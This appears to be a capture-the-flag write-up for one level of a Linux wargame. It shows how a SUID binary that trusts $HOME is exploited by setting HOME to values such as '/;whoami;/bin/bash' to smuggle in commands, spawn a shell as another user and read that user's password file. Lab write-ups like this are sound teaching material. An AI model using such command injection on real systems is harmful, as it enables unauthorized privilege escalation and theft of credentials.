# 0x07

moving from `aphrodite` to `ariadne`

---

The mission clue for this level focused on the user's home environment:

```bash
aphrodite@hades:~$ cat mission.txt 
################
# MISSION 0x07 #
################

## EN ##
The user ariadne knows what we keep in our HOME.
```

In the home directory, there was a binary named `homecontent` with **SUID** permissions and the restricted password file for the next user.

```bash
aphrodite@hades:~$ ls -la
total 52
...
-r--r----- 1 ariadne   ariadne      21 Apr  5  2024 ariadne_pass.txt
-rwS--s--- 1 root      aphrodite 16216 Apr  5  2024 homecontent
-rw-r----- 1 root      aphrodite   185 Apr  5  2024 mission.txt
```

### The Solution: Command Injection via Environment Variable

The binary `homecontent` was designed to list the contents of a directory, but it relied on the `$HOME` environment variable to determine which directory to display. Because the program likely used a system call without sanitizing this variable, it was vulnerable to **Command Injection**.

#### Step 1: Confirming the Vulnerability

I tested if the program would accept a modified `$HOME` variable. By setting it to a root path followed by a command, I confirmed the injection worked.

```bash
aphrodite@hades:~$ HOME="/;whoami" ; ./homecontent
The content of your HOME is:
bin  boot  dev  etc ...
ariadne
```

#### Step 2: Spawning a Privileged Shell

Since the binary had SUID permissions for `ariadne`, I injected a command to spawn a bash shell. By appending `; /bin/bash` to the variable, the program executed the directory listing and then immediately started a new shell under the target user's context.

```bash
aphrodite@hades:/pwned/aphrodite$ HOME="/pwned/;whoami;/bin/bash" ; ./homecontent
...
ariadne
ariadne@hades:/pwned/aphrodite$ id
uid=2049(ariadne) gid=2048(aphrodite) groups=2048(aphrodite)
```

### Explanation

* **SUID (Set User ID)**: This permission allows a user to run an executable with the permissions of the executable's owner. In this case, the binary allowed `aphrodite` to act with `ariadne`'s authority.
* **Environment Variable Injection**: Many programs trust system variables like `$HOME`. If these are passed directly into a shell command (e.g., `system("ls " + HOME)`), an attacker can use separators like `;` to run unauthorized code.
* **The Semicolon (`;`)**: In Linux, the semicolon is a command separator. It allows the execution of multiple independent commands on a single line.

### Execution

With the shell running as `ariadne`, I successfully read the password file.

```bash
ariadne@hades:/pwned/aphrodite$ cat ariadne_pass.txt 
[REDACTED]
```

Using the password, I logged in via SSH to establish a clean, full-privilege session.

```bash
ariadne@hades:/pwned/aphrodite$ ssh ariadne@localhost
ariadne@hades:~$ id
uid=2049(ariadne) gid=2049(ariadne) groups=2049(ariadne)
```
